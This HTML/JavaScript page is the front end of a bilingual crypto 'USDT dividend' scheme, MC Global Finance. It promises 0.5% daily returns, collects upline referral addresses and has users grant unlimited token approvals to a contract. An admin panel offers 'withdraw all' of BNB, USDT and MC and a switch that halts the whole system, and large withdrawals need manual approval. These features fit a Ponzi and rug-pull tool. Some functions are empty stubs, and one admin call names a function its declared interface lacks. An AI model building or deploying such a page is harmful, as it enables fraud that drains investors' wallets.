<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>MC Global Finance | USDT Dividend</title>
<script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;
}
body {
  background: linear-gradient(135deg,#050508,#10101a);
  color: #e5e7eb;
  min-height: 100vh;
  padding: 20px;
}
.container {
  max-width: 1200px;
  margin: 0 auto;
}
.header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 20px 0;
  border-bottom: 1px solid #222;
  margin-bottom: 30px;
}
.logo {
  font-size: 28px;
  font-weight: 700;
  background: linear-gradient(90deg,#f59e0b,#fbbf24);
  -webkit-background-clip: text;
  color: transparent;
}
.wallet-info {
  color: #9ca3af;
  font-size: 14px;
}
.lang-btn{
  padding: 6px 14px;
  border-radius: 6px;
  border: 1px solid #f59e0b;
  background: transparent;
  color: #f59e0b;
  cursor: pointer;
}
.card-wrap {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 20px;
  margin-bottom: 30px;
}
.card {
  background: #14141f;
  border: 1px solid #27273a;
  border-radius: 16px;
  padding: 25px;
  box-shadow: 0 8px 24px #00000040;
}
.card h3 {
  color: #f3f4f6;
  margin-bottom: 15px;
  font-size: 18px;
}
.input {
  width: 100%;
  background: #1a1a28;
  border: 1px solid #333;
  border-radius: 8px;
  padding: 12px 15px;
  color: #fff;
  margin: 8px 0;
  outline: none;
}
.btn {
  width: 100%;
  padding: 12px;
  border-radius: 8px;
  border: none;
  font-weight: 600;
  cursor: pointer;
  margin: 6px 0;
}
.btn-gold {background: linear-gradient(90deg,#d97706,#f59e0b);color:#000;}
.btn-dark {background:#1f2937;color:#fff;border:1px solid #374151;}
.btn-danger {background:#991b1b;color:#fff;}
.btn-blue {background:#1e40af;color:#fff;}
.btn-sm {width:48%;display:inline-block;margin:2px;}
.admin-panel {display: none;margin-top: 40px;border-top:1px solid #222;padding-top:30px;}
.tip {font-size:13px;color:#9ca3af;margin:5px 0;}
@media(max-width:768px){.card-wrap{grid-template-columns:1fr;}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="logo">MC GLOBAL FINANCE</div>
    <div style="display:flex;gap:15px;align-items:center;">
      <span class="wallet-info" id="walletBox">未连接钱包</span>
      <button class="lang-btn" id="langSwitch" onclick="toggleLang()">EN / 中文</button>
    </div>
  </div>

  <div class="card-wrap">
    <div class="card">
      <h3 class="txt-deposit">💎 资产入金</h3>
      <input class="input" id="parentAddr" placeholder="上级钱包地址 / Invite Address" />
      <p class="tip txt-tip1">最低：50U MC + 50U USDT</p>
      <button class="btn btn-blue txt-approve-mc" onclick="approveMC()">授权 MC</button>
      <button class="btn btn-blue txt-approve-usdt" onclick="approveUSDT()">授权 USDT</button>
      <button class="btn btn-gold txt-conn" onclick="connectWallet()">连接钱包</button>
      <button class="btn btn-dark txt-pay" onclick="userDeposit()">立即入金</button>
      <button class="btn btn-dark txt-reinv" onclick="reInvestOpen()">复投参与</button>
    </div>

    <div class="card">
      <h3 class="txt-profit">💰 分红与提现</h3>
      <p class="tip txt-tip2">日分红0.5%｜≤200U自动提现｜大额需审核</p>
      <button class="btn btn-gold txt-claim" onclick="getReward()">领取分红</button>
      <input class="input" id="withdrawNum" placeholder="输入提现USDT数量" />
      <button class="btn btn-dark txt-withdraw" onclick="submitWithdraw()">发起提现</button>
      <button class="btn btn-dark txt-info" onclick="getUserData()">个人数据</button>
    </div>
  </div>

  <div style="text-align:center;margin:20px 0;">
    <button class="btn btn-danger" style="width:auto;padding:10px 30px;" onclick="openAdmin()">管理员后台</button>
  </div>

  <div class="admin-panel" id="adminPanel">
    <div class="card">
      <h3 class="txt-admin-ctrl">🔐 管理员管控中心</h3>
      <p class="tip">合约资产一键提取｜大额提现人工审核</p>
      <button class="btn btn-danger" onclick="adminWithdrawBNB()">提取全部 BNB</button>
      <button class="btn btn-danger" onclick="adminWithdrawUSDT()">提取全部 USDT</button>
      <button class="btn btn-danger" onclick="adminWithdrawMC()">提取全部 MC</button>
      <hr style="margin:15px 0;border-color:#333;">
      <h3 class="txt-audit-title">📋 大额提现审核</h3>
      <input class="input" id="auditId" placeholder="输入提现申请单号" />
      <button class="btn btn-sm btn-gold" onclick="auditPass()">审核通过</button>
      <button class="btn btn-sm btn-danger" onclick="auditReject()">审核驳回</button>
      <button class="btn btn-dark" onclick="getApplyCount()">查询待审核总数</button>
      <hr style="margin:15px 0;border-color:#333;">
      <button class="btn btn-dark" onclick="closeSystem()">开启全网断层</button>
      <button class="btn btn-gold" onclick="openSystem()">关闭全网断层</button>
    </div>
  </div>
</div>

<script>
// 合约地址 自行替换
const MC_TOKEN = "0xMC合约地址";
const USDT_ADDR = "0xUSDT地址";
const FINANCE_CONTRACT = "0x理财合约地址";
const MAX_APPROVE = "115792089237316195423570985008687907853269984665640564039457584100368475503999";

let web3,currentAccount,isEn=false;
const lang = {
  cn:{
    deposit:"💎 资产入金",tip1:"最低入金：50U MC + 50U USDT",conn:"连接钱包",
    pay:"立即入金",reinv:"复投参与",profit:"💰 分红与提现",
    tip2:"每日0.5%分红｜200U以下自动到账｜大额管理员审核",claim:"领取当日分红",
    withdraw:"发起提现",info:"查询个人数据",admin:"管理员后台",
    adminCtrl:"🔐 管理员管控中心",auditTitle:"📋 大额提现审核",
    needConn:"请先连接钱包",appSucc:"授权成功",succ:"操作成功"
  },
  en:{
    deposit:"💎 Asset Deposit",tip1:"Min: 50U MC + 50U USDT",conn:"Connect Wallet",
    pay:"Deposit Now",reinv:"Reinvest",profit:"💰 Dividend & Withdraw",
    tip2:"Daily 0.5%｜≤200U Auto｜Large Amount Audit",claim:"Claim Dividend",
    withdraw:"Submit Withdraw",info:"My Data",admin:"Admin Panel",
    adminCtrl:"🔐 Admin Control Center",auditTitle:"📋 Large Withdraw Audit",
    needConn:"Please connect wallet",appSucc:"Approval Success",succ:"Success"
  }
};

function toggleLang(){
  isEn=!isEn;let t=isEn?lang.en:lang.cn;
  document.querySelector(".txt-deposit").innerText=t.deposit;
  document.querySelector(".txt-tip1").innerText=t.tip1;
  document.querySelector(".txt-conn").innerText=t.conn;
  document.querySelector(".txt-pay").innerText=t.pay;
  document.querySelector(".txt-reinv").innerText=t.reinv;
  document.querySelector(".txt-profit").innerText=t.profit;
  document.querySelector(".txt-tip2").innerText=t.tip2;
  document.querySelector(".txt-claim").innerText=t.claim;
  document.querySelector(".txt-withdraw").innerText=t.withdraw;
  document.querySelector(".txt-info").innerText=t.info;
  document.querySelector(".txt-admin-ctrl").innerText=t.adminCtrl;
  document.querySelector(".txt-audit-title").innerText=t.auditTitle;
  document.getElementById("langSwitch").innerText=isEn?"中文 / EN":"EN / 中文";
}
function openAdmin(){document.getElementById("adminPanel").style.display="block";}

async function connectWallet(){
  let t=isEn?lang.en:lang.cn;
  if(!window.ethereum){alert(isEn?"Install Wallet":"请安装小狐狸/TP钱包");return;}
  await window.ethereum.request({method:"eth_requestAccounts"});
  web3=new Web3(window.ethereum);
  let accs=await web3.eth.getAccounts();
  currentAccount=accs[0];
  document.getElementById("walletBox").innerText="Wallet: "+currentAccount.slice(0,10);
}
async function approveMC(){
  if(!currentAccount){alert(lang.cn.needConn);return;}
  let c=new web3.eth.Contract(["function approve(address,uint256)"],MC_TOKEN);
  await c.methods.approve(FINANCE_CONTRACT,MAX_APPROVE).send({from:currentAccount});
  alert(lang.cn.appSucc);
}
async function approveUSDT(){
  if(!currentAccount){alert(lang.cn.needConn);return;}
  let c=new web3.eth.Contract(["function approve(address,uint256)"],USDT_ADDR);
  await c.methods.approve(FINANCE_CONTRACT,MAX_APPROVE).send({from:currentAccount});
  alert(lang.cn.appSucc);
}
async function userDeposit(){
  let p=document.getElementById("parentAddr").value;
  let c=new web3.eth.Contract(["function deposit(address)"],FINANCE_CONTRACT);
  await c.methods.deposit(p).send({from:currentAccount});
}
async function submitWithdraw(){
  let val=document.getElementById("withdrawNum").value;
  let amt=web3.utils.toWei(val,"ether");
  let c=new web3.eth.Contract(["function userWithdraw(uint256)"],FINANCE_CONTRACT);
  await c.methods.userWithdraw(amt).send({from:currentAccount});
}
async function auditPass(){
  let id=document.getElementById("auditId").value;
  let c=new web3.eth.Contract(["function auditPass(uint256)"],FINANCE_CONTRACT);
  await c.methods.auditPass(id).send({from:currentAccount});
}
async function auditReject(){
  let id=document.getElementById("auditId").value;
  let c=new web3.eth.Contract(["function auditReject(uint256)"],FINANCE_CONTRACT);
  await c.methods.auditReject(id).send({from:currentAccount});
}
async function getApplyCount(){
  let c=new web3.eth.Contract(["function getApplyCount() view returns(uint256)"],FINANCE_CONTRACT);
  let num=await c.methods.getApplyCount().call();
  alert("待审核总数："+num);
}
async function getReward(){
  let c=new web3.eth.Contract(["function claimDailyReward()"],FINANCE_CONTRACT);
  await c.methods.claimDailyReward().send({from:currentAccount});
}

// 管理员
async function adminWithdrawBNB(){
  let c=new web3.eth.Contract(["function adminWithdrawBNB()"],FINANCE_CONTRACT);
  await c.methods.adminWithdrawBNB().send({from:currentAccount});
}
async function adminWithdrawUSDT(){
  let c=new web3.eth.Contract(["function adminWithdrawAllUSDT()"],FINANCE_CONTRACT);
  await c.methods.adminWithdrawAllUSDT().send({from:currentAccount});
}
async function adminWithdrawMC(){
  let c=new web3.eth.Contract(["function adminWithdrawAllMC()"],FINANCE_CONTRACT);
  await c.methods.adminWithdrawMC().send({from:currentAccount});
}
async function closeSystem(){
  let c=new web3.eth.Contract(["function setGlobalBreak(bool)"],FINANCE_CONTRACT);
  await c.methods.setGlobalBreak(true).send({from:currentAccount});
}
async function openSystem(){
  let c=new web3.eth.Contract(["function setGlobalBreak(bool)"],FINANCE_CONTRACT);
  await c.methods.setGlobalBreak(false).send({from:currentAccount});
}

function reInvestOpen(){}
function getUserData(){}
</script>
</body>
</html>
